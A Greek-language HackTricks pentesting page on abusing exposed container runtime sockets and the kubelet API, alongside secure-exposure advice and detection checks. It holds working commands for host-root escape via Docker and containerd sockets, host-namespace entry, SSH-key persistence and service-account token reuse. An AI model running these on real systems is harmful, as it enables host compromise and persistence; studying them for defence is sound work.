# Έκθεση Runtime API και Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλοί πραγματικοί συμβιβασμοί containers δεν ξεκινούν από διαφυγή από namespace. Ξεκινούν από πρόσβαση στο επίπεδο ελέγχου του runtime. Αν ένα workload μπορεί να επικοινωνήσει με τα `dockerd`, `containerd`, CRI-O, Podman ή kubelet μέσω ενός προσαρτημένου Unix socket ή ενός εκτεθειμένου TCP listener, ο attacker μπορεί να είναι σε θέση να ζητήσει τη δημιουργία ενός νέου container με αυξημένα προνόμια, να προσαρτήσει το filesystem του host, να συμμετάσχει στα namespaces του host ή να ανακτήσει ευαίσθητες πληροφορίες του node. Σε αυτές τις περιπτώσεις, το runtime API είναι το πραγματικό όριο ασφαλείας και η παραβίασή του ισοδυναμεί ουσιαστικά με παραβίαση του host.

Γι’ αυτό η έκθεση runtime socket πρέπει να τεκμηριώνεται ξεχωριστά από τις προστασίες του kernel. Ένα container με συνηθισμένο seccomp, capabilities και περιορισμούς MAC μπορεί και πάλι να απέχει μόλις ένα API call από την παραβίαση του host, αν το `/var/run/docker.sock` ή το `/run/containerd/containerd.sock` είναι προσαρτημένο σε αυτό. Η απομόνωση του τρέχοντος container από τον kernel μπορεί να λειτουργεί ακριβώς όπως έχει σχεδιαστεί, ενώ το επίπεδο διαχείρισης του runtime παραμένει πλήρως εκτεθειμένο.

## Μοντέλα πρόσβασης σε Daemon

Το Docker Engine παραδοσιακά εκθέτει το προνομιούχο API του μέσω του τοπικού Unix socket `unix:///var/run/docker.sock`. Ιστορικά, έχει εκτεθεί και απομακρυσμένα μέσω TCP listeners, όπως `tcp://0.0.0.0:2375`, ή μέσω listener με προστασία TLS στη θύρα `2376`. Η απομακρυσμένη έκθεση του daemon χωρίς ισχυρό TLS και έλεγχο ταυτότητας client ουσιαστικά μετατρέπει το Docker API σε απομακρυσμένη διεπαφή root.

Τα containerd, CRI-O, Podman και kubelet εκθέτουν παρόμοιες επιφάνειες υψηλού αντίκτυπου. Οι ονομασίες και οι ροές εργασίας διαφέρουν, αλλά η λογική είναι ίδια. Αν η διεπαφή επιτρέπει στον caller να δημιουργεί workloads, να προσαρτά διαδρομές του host, να ανακτά διαπιστευτήρια ή να τροποποιεί εκτελούμενα containers, τότε αποτελεί προνομιούχο κανάλι διαχείρισης και πρέπει να αντιμετωπίζεται ανάλογα.

Ένα web UI διαχείρισης containers μπορεί να εκθέσει το ίδιο όριο χωρίς να παρέχει στον τοπικό λογαριασμό άμεση πρόσβαση στο socket. Για παράδειγμα, το [Portainer issue #493](https://github.com/portainer/portainer/issues/493) κατέγραψε επαναφορά κωδικού πρόσβασης administrator χωρίς authentication σε μια παλαιότερη έκδοση 1.11.1. Αντιμετωπίστε ένα τοπικά προσβάσιμο UI μόνο ως ένδειξη προς διερεύνηση: επιβεβαιώστε την εγκατεστημένη έκδοση και τη συμπεριφορά authentication, τον πραγματικό έλεγχο administrator και αν το endpoint που διαχειρίζεται μπορεί να δημιουργήσει containers με writable host bind mount. Η [τεκμηρίωση του Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) αναφέρει ότι η διαχείριση μέσω socket απαιτεί πρόσβαση στο Docker socket· ένα rootless ή περιορισμένο endpoint αλλάζει τον αντίκτυπο στον host. Μην συμπεραίνετε ότι υπάρχει το πρόβλημα authentication ή πρόσβαση root στον host μόνο από το όνομα μιας διεργασίας, μια θύρα ή μια συμβολοσειρά έκδοσης.

Συνηθισμένες τοπικές διαδρομές που αξίζει να ελεγχθούν είναι οι εξής:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Παλαιότερα ή πιο εξειδικευμένα stacks μπορεί επίσης να εκθέτουν endpoints όπως τα `dockershim.sock`, `frakti.sock` ή `rktlet.sock`. Αυτά είναι λιγότερο συνηθισμένα σε σύγχρονα περιβάλλοντα, αλλά όταν τα συναντάτε, πρέπει να αντιμετωπίζονται με την ίδια προσοχή, επειδή αποτελούν επιφάνειες ελέγχου του runtime και όχι συνηθισμένα application sockets.

## Ασφαλής απομακρυσμένη πρόσβαση

Αν ένας daemon πρέπει να εκτεθεί πέρα από το τοπικό socket, η σύνδεση πρέπει να προστατεύεται με TLS και, κατά προτίμηση, με αμοιβαία αυθεντικοποίηση, ώστε ο daemon να επαληθεύει τον client και ο client να επαληθεύει τον daemon. Η παλιά συνήθεια να ανοίγει κανείς τον Docker daemon μέσω απλού HTTP για λόγους ευκολίας είναι ένα από τα πιο επικίνδυνα λάθη στη διαχείριση containers, επειδή η επιφάνεια του API είναι αρκετά ισχυρή ώστε να δημιουργεί απευθείας προνομιούχα containers.

Το ιστορικό μοτίβο διαμόρφωσης του Docker έμοιαζε ως εξής:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Σε hosts που βασίζονται στο systemd, η επικοινωνία του daemon μπορεί επίσης να εμφανίζεται ως `fd://`, δηλαδή η διεργασία κληρονομεί ένα socket που έχει ανοίξει εκ των προτέρων το systemd, αντί να κάνει η ίδια απευθείας bind σε αυτό. Το σημαντικό δίδαγμα δεν είναι η ακριβής σύνταξη, αλλά η συνέπεια για την ασφάλεια. Μόλις ο daemon κάνει listen πέρα από ένα τοπικό socket με αυστηρά δικαιώματα, η ασφάλεια μεταφοράς και η πιστοποίηση ταυτότητας των clients γίνονται υποχρεωτικές και όχι προαιρετικές ενισχύσεις της ασφάλειας.

## Κατάχρηση

Αν υπάρχει socket runtime, επιβεβαιώστε ποιο είναι, αν υπάρχει συμβατό client και αν είναι δυνατή η πρόσβαση μέσω raw HTTP ή gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Αυτές οι εντολές είναι χρήσιμες, επειδή διακρίνουν μια ανενεργή διαδρομή από ένα προσαρτημένο αλλά μη προσβάσιμο socket και από ένα ενεργό προνομιούχο API. Αν το client λειτουργήσει, το επόμενο ερώτημα είναι αν το API μπορεί να εκκινήσει ένα νέο container με host bind mount ή κοινή χρήση host namespace.

### Όταν δεν είναι εγκατεστημένο κανένα client

Η απουσία των `docker`, `podman` ή κάποιου άλλου εύχρηστου CLI δεν σημαίνει ότι το socket είναι ασφαλές. Το Docker Engine επικοινωνεί μέσω HTTP πάνω από το Unix socket, ενώ το Podman εκθέτει τόσο ένα API συμβατό με το Docker όσο και ένα εγγενές API Libpod μέσω του `podman system service`. Αυτό σημαίνει ότι ακόμη και ένα ελάχιστο περιβάλλον με μόνο το `curl` μπορεί να αρκεί για τον χειρισμό του daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Για εκτέλεση κώδικα PHP υπό περιορισμούς `open_basedir`, [οι συνδέσεις μέσω Unix socket παραμένουν μια ξεχωριστή διαδρομή](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir), όταν η διεργασία PHP έχει δικαιώματα λειτουργικού συστήματος για σύνδεση.

Αυτό έχει σημασία κατά το post-exploitation, επειδή οι defenders μερικές φορές αφαιρούν τα συνηθισμένα client binaries, αλλά αφήνουν προσαρτημένο το management socket. Σε hosts με Podman, θυμηθείτε ότι η διαδρομή υψηλής αξίας διαφέρει μεταξύ rootful και rootless deployments: `unix:///run/podman/podman.sock` για rootful service instances και `unix://$XDG_RUNTIME_DIR/podman/podman.sock` για rootless ones.

### Πλήρες παράδειγμα: Από Docker Socket σε root του host

Αν είναι προσβάσιμο το `docker.sock`, η κλασική διαφυγή είναι να ξεκινήσετε ένα νέο container που προσαρτά το root filesystem του host και, στη συνέχεια, να εκτελέσετε `chroot` σε αυτό:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Αυτό παρέχει άμεση εκτέλεση ως root του host μέσω του Docker daemon. Ο αντίκτυπος δεν περιορίζεται στην ανάγνωση αρχείων. Μόλις εισέλθει στο νέο container, ο επιτιθέμενος μπορεί να τροποποιήσει αρχεία του host, να συλλέξει διαπιστευτήρια, να εγκαταστήσει μηχανισμούς persistence ή να εκκινήσει επιπλέον workloads με αυξημένα προνόμια.

### Πλήρες παράδειγμα: Από το Docker Socket στα Host Namespaces

Αν ο επιτιθέμενος προτιμά την είσοδο σε namespace αντί για πρόσβαση μόνο στο filesystem:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Αυτή η διαδρομή φτάνει στον host ζητώντας από το runtime να δημιουργήσει ένα νέο container με ρητή έκθεση των host namespaces, αντί να εκμεταλλευτεί το τρέχον container.

### Μοτίβο Persistence μέσω Docker Socket

Ο έλεγχος του runtime μπορεί επίσης να χρησιμοποιηθεί για persistence αντί για ένα shell μίας χρήσης. Το γενικό μοτίβο είναι η δημιουργία ενός helper container με mount στον host, η εγγραφή εξουσιοδοτημένου υλικού πρόσβασης ή ενός startup hook στο προσαρτημένο filesystem του host και, στη συνέχεια, η επαλήθευση ότι ο host το χρησιμοποιεί.

Ενδεικτική μορφή:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Η ίδια ιδέα μπορεί να στοχεύσει μονάδες systemd, τμήματα cron, αρχεία εκκίνησης εφαρμογών ή κλειδιά SSH, ανάλογα με το τι θέλει να αποδείξει ο operator. Το σημαντικό είναι ότι η μόνιμη αλλαγή γίνεται μέσω της εξουσιοδότησης του runtime daemon για πρόσβαση στο filesystem του host και όχι μέσω πρόσθετων δικαιωμάτων στο αρχικό container.

### Raw Docker API Helper Pivot

Όταν λείπει το Docker CLI, η ίδια ροή helper με host mount μπορεί να εκτελεστεί μέσω HTTP πάνω από το Unix socket. Η γενική ροή είναι: επιβεβαίωση του API, δημιουργία ενός helper container με bind mount του host, εκκίνηση του, δημιουργία μιας exec instance και εκκίνησή της.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Το τελικό αίτημα `/exec/<id>/start` εξαρτάται από το exec ID που επιστρέφεται, αλλά το ζήτημα ασφάλειας δεν εξαρτάται από τις ακριβείς λεπτομέρειες του JSON: η άμεση πρόσβαση στο API ενός rootful Docker daemon αρκεί για να ζητηθεί ένα ισχυρότερο βοηθητικό workload.

### Πλήρες παράδειγμα: Socket του containerd

Ένα προσαρτημένο socket του `containerd` είναι συνήθως εξίσου επικίνδυνο:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Αν υπάρχει διαθέσιμος ένας client πιο παρόμοιος με το Docker, το `nerdctl` μπορεί να είναι πιο βολικό από το `ctr`, επειδή παρέχει γνώριμα flags όπως τα `--privileged`, `--pid=host` και `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Ο αντίκτυπος είναι και πάλι η παραβίαση του host. Ακόμα κι αν απουσιάζουν τα εργαλεία που αφορούν ειδικά το Docker, κάποιο άλλο runtime API μπορεί να προσφέρει την ίδια διοικητική ισχύ. Σε κόμβους Kubernetes, το `crictl` μπορεί επίσης να αρκεί για αναγνώριση και αλληλεπίδραση με containers, καθώς επικοινωνεί απευθείας με το endpoint του CRI.

### BuildKit Socket

Το `buildkitd` είναι εύκολο να παραβλεφθεί, επειδή πολλοί το θεωρούν «απλώς το backend για το build», αλλά ο daemon εξακολουθεί να αποτελεί προνομιακό επίπεδο ελέγχου. Ένα προσβάσιμο `buildkitd.sock` μπορεί να επιτρέψει σε έναν attacker να εκτελέσει αυθαίρετα βήματα build, να επιθεωρήσει τις δυνατότητες των workers, να χρησιμοποιήσει τοπικά contexts από το παραβιασμένο περιβάλλον και να ζητήσει επικίνδυνα entitlements όπως `network.host` ή `security.insecure`, εφόσον ο daemon έχει ρυθμιστεί ώστε να τα επιτρέπει.

Οι πρώτες χρήσιμες ενέργειες είναι οι εξής:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Αν ο daemon δέχεται αιτήματα build, ελέγξτε αν είναι διαθέσιμα μη ασφαλή entitlements:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Ο ακριβής αντίκτυπος εξαρτάται από τη ρύθμιση του daemon, αλλά μια rootful υπηρεσία BuildKit με permissive entitlements δεν είναι μια ακίνδυνη ευκολία για developers. Αντιμετωπίστε την ως μια ακόμη επιφάνεια διαχείρισης υψηλής αξίας, ιδιαίτερα σε CI runners και κοινόχρηστους κόμβους build.

### Kubelet API μέσω TCP

Το kubelet δεν είναι container runtime, αλλά εξακολουθεί να αποτελεί μέρος του επιπέδου διαχείρισης του κόμβου και συχνά περιλαμβάνεται στην ίδια συζήτηση για τα όρια εμπιστοσύνης. Αν η ασφαλής θύρα του kubelet `10250` είναι προσβάσιμη από το workload ή αν εκτεθούν διαπιστευτήρια κόμβου, kubeconfigs ή δικαιώματα proxy, ο επιτιθέμενος μπορεί να είναι σε θέση να απαριθμήσει Pods, να ανακτήσει logs ή να εκτελέσει εντολές σε containers τοπικά στον κόμβο, χωρίς να αγγίξει καθόλου τη διαδρομή admission του Kubernetes API server.

Ξεκινήστε με απλή αναγνώριση:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Αν η διαδρομή proxy του kubelet ή του API server εξουσιοδοτεί το `exec`, ένα client που υποστηρίζει WebSocket μπορεί να το μετατρέψει σε εκτέλεση κώδικα σε άλλα containers του node. Αυτός είναι επίσης ο λόγος που το `nodes/proxy` με μόνο δικαίωμα `get` είναι πιο επικίνδυνο απ’ όσο ακούγεται: το αίτημα μπορεί και πάλι να φτάσει σε endpoints του kubelet που εκτελούν εντολές, ενώ αυτές οι άμεσες αλληλεπιδράσεις με το kubelet δεν εμφανίζονται στα συνήθη audit logs του Kubernetes.<sup>[[2]](#references)</sup>

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να διαπιστωθεί αν το container μπορεί να φτάσει σε κάποιο επίπεδο διαχείρισης που θα έπρεπε να παραμένει εκτός του ορίου εμπιστοσύνης.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Τι είναι ενδιαφέρον εδώ:

- Ένα προσαρτημένο runtime socket αποτελεί συνήθως άμεσο δικαίωμα διαχείρισης και όχι απλώς αποκάλυψη πληροφοριών.
- Ένας TCP listener στη θύρα `2375` χωρίς TLS πρέπει να αντιμετωπίζεται ως συνθήκη απομακρυσμένης παραβίασης.
- Οι μεταβλητές περιβάλλοντος όπως η `DOCKER_HOST` συχνά αποκαλύπτουν ότι το workload σχεδιάστηκε σκόπιμα ώστε να επικοινωνεί με το runtime του host.

## Προεπιλεγμένες ρυθμίσεις runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθεις χειροκίνητες αποδυναμώσεις |
| --- | --- | --- | --- |
| Docker Engine | Τοπικό Unix socket από προεπιλογή | Το `dockerd` ακούει στο τοπικό socket και ο daemon συνήθως εκτελείται με δικαιώματα root | προσάρτηση του `/var/run/docker.sock`, έκθεση του `tcp://...:2375`, αδύναμο ή ανύπαρκτο TLS στη θύρα `2376` |
| Podman | CLI χωρίς daemon από προεπιλογή | Δεν απαιτείται daemon με μακρόχρονη διάρκεια ζωής και αυξημένα δικαιώματα για συνήθη τοπική χρήση· τα API sockets μπορεί και πάλι να εκτεθούν όταν είναι ενεργοποιημένο το `podman system service` | έκθεση του `podman.sock`, ευρεία εκτέλεση της υπηρεσίας, χρήση API με δικαιώματα root |
| containerd | Τοπικό socket με αυξημένα δικαιώματα | Το administrative API εκτίθεται μέσω του τοπικού socket και συνήθως χρησιμοποιείται από εργαλεία υψηλότερου επιπέδου | προσάρτηση του `containerd.sock`, ευρεία πρόσβαση μέσω `ctr` ή `nerdctl`, έκθεση privileged namespaces |
| CRI-O | Τοπικό socket με αυξημένα δικαιώματα | Το CRI endpoint προορίζεται για έμπιστα στοιχεία του ίδιου node | προσάρτηση του `crio.sock`, έκθεση του CRI endpoint σε μη έμπιστα workloads |
| Kubernetes kubelet | API διαχείρισης τοπικό στο node | Το kubelet δεν θα πρέπει να είναι ευρέως προσβάσιμο από Pods· ανάλογα με το authn/authz, η πρόσβαση μπορεί να αποκαλύψει κατάσταση Pods, credentials και δυνατότητες εκτέλεσης | προσάρτηση kubelet sockets ή certs, αδύναμο kubelet auth, host networking σε συνδυασμό με προσβάσιμο kubelet endpoint |

## References

- [1] [Εκμετάλλευση socket containerd, μέρος 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Κίνδυνοι παράκαμψης του Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
